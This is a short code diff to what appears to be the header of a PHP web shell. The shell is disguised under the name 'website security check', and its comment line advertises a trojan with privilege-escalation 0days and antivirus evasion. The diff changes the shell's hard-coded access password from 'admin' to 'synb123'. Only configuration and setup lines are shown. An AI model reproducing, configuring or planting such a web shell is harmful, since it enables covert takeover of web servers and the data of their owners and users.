@@ -1,5 +1,5 @@
 <?php
-$password='admin';//默认密码admin
+$password='synb123';//默认密码admin
 $shellname='网站安全检测';//我的版权
 $myurl="caidaome.com发布超强版本php木马 各种提权0day 长期更新免杀";//我的主页
 error_reporting(E_ERROR | E_PARSE);@set_time_limit(0);
